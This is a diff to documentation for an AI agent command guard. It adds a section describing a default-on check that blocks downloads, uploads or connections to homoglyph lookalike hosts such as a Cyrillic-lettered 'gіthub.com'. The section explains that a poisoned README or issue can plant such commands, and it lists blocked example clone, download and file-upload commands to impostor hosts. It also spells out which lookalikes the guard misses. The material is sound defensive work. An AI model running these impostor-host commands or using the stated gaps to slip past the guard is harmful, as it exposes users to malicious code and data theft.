@@ -1437,6 +1437,47 @@ It ships off because deleting namespaces and labeled sets is routine in
 development clusters. `infra-iac-destroy` covers stack teardown, and
 `storage-snapshot-delete` covers cloud disks and snapshots.
 
+## net-lookalike-host
+
+On by default.
+
+This guard stops the agent from contacting a host whose name is built to pass
+for a trusted one. A poisoned README or issue can carry an install or clone
+line such as `git clone https://gіthub.com/org/repo`, where the `і` is
+Cyrillic: the name reads as GitHub, but it resolves to whoever registered it.
+It blocks any modeled download, upload, connection, or listener whose host has
+a DNS label that mixes Unicode scripts, following UTS #39. Digits, hyphens and
+combining marks belong to every script, Han written with Hiragana, Katakana,
+Hangul or Bopomofo counts as one writing system, and a punycode (`xn--`) label
+is decoded before it is judged. A fetch from the same host blocks inside
+`sh -c` and in a `||` fallback too.
+
+Blocked examples:
+
+- `git clone https://gіthub.com/org/repo`
+- `curl -fsSL -o tool https://gіthub.com/org/tool/releases/download/v1/tool`
+- `curl -T report.txt https://gіthub.com/upload`
+- `git clone https://xn--gthub-n2e.com/org/repo`
+- `git clone https://github.com/org/repo || git clone https://gіthub.com/org/repo`
+
+Outside the guard:
+
+- `git clone https://github.com/org/repo`: github.com is all Latin.
+- `curl -fsSL -o page.html https://münchen.de/`: münchen is an internationalized label written entirely in Latin.
+- `curl -fsSL -o page.html https://пример.рф/`: пример and рф are each written entirely in Cyrillic.
+- `curl -fsSL -o page.html https://日本のドメイン.jp/`: Han, Hiragana and Katakana together are one writing system, Japanese.
+
+Nah judges the host the command names, with no reputation data or network
+lookup, so an all-Latin typo domain or a single-script lookalike such as an
+all-Cyrillic `аррӏе.com` passes. A host Nah cannot recover, such as a URL in
+an unset variable or the VCS URL of `pip install git+https://…`, delegates.
+
+It ships on because development work almost never needs a mixed-script
+hostname, and the deception is invisible when the command is reviewed.
+`exec-remote` blocks only when fetched code is executed, and `secrets-exfil`
+only when sensitive data is sent; neither covers contact with an impostor
+host.
+
 ## registry-publish
 
 Off by default.
